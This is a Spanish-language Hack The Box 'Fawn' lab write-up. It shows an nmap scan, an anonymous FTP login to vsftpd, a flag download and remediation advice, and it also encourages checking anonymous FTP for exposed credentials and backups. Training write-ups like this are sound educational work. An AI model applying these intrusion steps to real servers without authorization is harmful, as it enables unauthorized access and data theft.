# HTB Machine Report — Fawn

**Date:** 2026-05-25
**Author:** Franksimon
**Platform:** Hack The Box — Starting Point
**Difficulty:** Very Easy
**OS:** Unix/Linux
**IP:** 10.129.18.152
**Status:** Pwned

---

## 1. Executive Summary

Fawn es una máquina Unix de nivel introductorio que expone un servidor FTP vsftpd 3.0.3 con login anónimo habilitado. El acceso anónimo permite listar y descargar archivos del servidor sin credenciales, incluyendo el archivo `flag.txt` en el directorio raíz del FTP.

---

## 2. Enumeration

### 2.1 Port Scan

```bash
sudo nmap -sC -sV -O 10.129.18.152
```

**Resultado:**

| Port  | State | Service | Version      |
|-------|-------|---------|--------------|
| 21/tcp | open | ftp     | vsftpd 3.0.3 |

TTL indica sistema Linux/Unix. nmap detectó automáticamente login anónimo habilitado y listó `flag.txt` vía script `ftp-anon`.

### 2.2 Service Enumeration

nmap reportó directamente:
- `Anonymous FTP login allowed (FTP code 230)`
- Archivo visible: `flag.txt` (32 bytes, Jun 04 2021)

---

## 3. Vulnerability Identification

| # | Vulnerability | CVE | CVSS | Location |
|---|--------------|-----|------|----------|
| 1 | FTP Anonymous Login habilitado | — | 7.5 | Puerto 21 |
| 2 | Protocolo FTP en texto plano | — | 5.0 | Puerto 21 |

**Por qué es explotable:**
FTP con login anónimo permite que cualquier usuario se autentique con el usuario `anonymous` y contraseña en blanco (o cualquier string). Las credenciales y el contenido viajan sin cifrado.

---

## 4. Exploitation

### 4.1 Acceso inicial — FTP Anonymous

```bash
ftp 10.129.18.152
# Name: anonymous
# Password: [Enter — en blanco]
```

```bash
# Dentro del cliente FTP:
ls
get flag.txt
exit
```

**Resultado:** Descarga exitosa de `flag.txt` como usuario anónimo.

---

## 5. Post-Exploitation

### 5.1 Root Flag

```bash
cat ~/flag.txt
```

**Flag:** `[REDACTED — HTB policy]`

---

## 6. Remediation

| Finding | Recommendation | Priority |
|---------|---------------|----------|
| FTP Anonymous login | Deshabilitar en vsftpd: `anonymous_enable=NO` | Critical |
| FTP texto plano | Migrar a SFTP o FTPS | High |
| Archivos sensibles expuestos | Auditar permisos de archivos en el servidor FTP | High |

---

## 7. Lessons Learned

- nmap con `-sC` ejecuta scripts por defecto — `ftp-anon` detecta y lista contenido automáticamente sin interacción manual.
- Siempre probar `anonymous` / `ftp` como usuario en puerto 21.
- FTP código `230` = Login successful. Código `226` = Transfer complete.
- Permisos locales importan: el cliente ftp descarga en el directorio de trabajo actual.

> **OSCP note:** FTP anónimo es frecuente en redes internas. Siempre revisar si hay archivos de configuración, credenciales o backups expuestos — no solo flags.

---

## 8. References

- HTB Starting Point — Fawn
- vsftpd config: `anonymous_enable` directive
- FTP RFC 959 — respuesta 230: User logged in
